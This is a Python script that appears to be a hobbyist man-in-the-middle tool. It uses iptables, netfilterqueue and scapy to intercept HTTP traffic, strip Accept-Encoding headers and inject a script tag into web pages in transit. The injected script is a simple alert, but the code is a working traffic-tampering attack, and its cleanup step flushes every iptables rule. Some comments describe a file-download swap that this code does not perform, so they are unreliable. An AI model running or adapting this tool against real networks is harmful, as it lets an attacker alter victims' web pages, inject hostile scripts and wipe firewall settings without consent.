# TODO: Refactor code

#!usr/bin/env python

#########################################################################
# Author : Dhrumil Mistry
#########################################################################


#########################################################################
# If you encounter Import error after installing netfilter use command 
# sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
#########################################################################


# Steps to test this tool
# 1. cd /var/www/html
# 2. sudo touch testfile.exe
# 3. sudo python3 -m http.server 80
# 4. run this script with superuser priviliges.
# 5. open any browser
# 6. visit localhost or your host ip to check whether site is up.
# 7. request localhost/testfile.exe
# 8. now you should get prompt to download brave browser instead of testfile.exe


from os import remove
from struct import pack
from subprocess import call

import netfilterqueue
import scapy.all as scapy
from re import sub

############################### Functions ############################### 
def forward_packets():
    '''
    configures the mitm for incoming request packets
    into a queue.
    '''

    call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
    # for local host
    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
    


def reset_config():
    '''
    resets the configurations changed while exectution of the program to 
    its original configuration.
    '''
    call('sudo iptables --flush', shell=True)


def set_load(packet, load):
    '''
    sets the packet raw layer load value to the passed load value
    '''
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    '''
    process received packet, everytime a packet is received.
    prints the packet received in the queue and it modifies
    the load value of the packet.
    '''
    scapy_pkt = scapy.IP(packet.get_payload())
    if scapy_pkt.haslayer(scapy.Raw):
        if scapy_pkt[scapy.TCP].dport == 80:
            print('[*] Request Detected!')
            # print(scapy_pkt.show())
            tampered_load = sub(b'Accept-Encoding:.*?\\r\\n',b'', scapy_pkt[scapy.Raw].load)
            new_pkt = set_load(scapy_pkt, tampered_load)
            packet.set_payload(bytes(new_pkt))

        elif scapy_pkt[scapy.TCP].sport == 80:
            print('[*] Response Detected!')
            load = scapy_pkt[scapy.Raw].load.decode('utf-8', 'ignore')
            load = load.replace('</BODY>', '</body>')
            if '</body>' in load:
                print('\n[+] Script/Code Injected!!\n')
                modified_load = load.replace('</body>', '<script>alert("Payload Added!!")</script> </body>')
                modified_load = modified_load.encode('utf-8', 'ignore')
                malacious_packet = set_load(scapy_pkt, modified_load)
                print(malacious_packet.show())
                #TODO: figure out a way to send the payload, we've successfully created a packet.
                #TODO: encode the below line into bytes readable form for the browser.
                packet.set_payload(bytes(malacious_packet))
        
    packet.accept()
    

############################### Main ############################### 

js_code = "<script>alert('Hola I am a pentester')</script>"


reset_config()

print('[*] configuring packet receiver...')

forward_packets()
print('[*] packet receiver configured successfully.\n')

print('[*] Creating Queue to start receiving packets.')
try:
    queue = netfilterqueue.NetfilterQueue()
    # Bind queue with queue-number 0
    queue.bind(0, process_packet)
    queue.run()

except OSError as e:
    print('[-] Run script with root priviliges.')
    print(e)

except KeyboardInterrupt:
    print('\r[-] Keyboard Interrupt detected!')

except Exception:
    print('[-] An Exception occurred while creating queue.\n', Exception)

finally:
    print('[*] Restoring previous configurations.. please be patient...')
    reset_config()

    print('[-] Program stopped.')
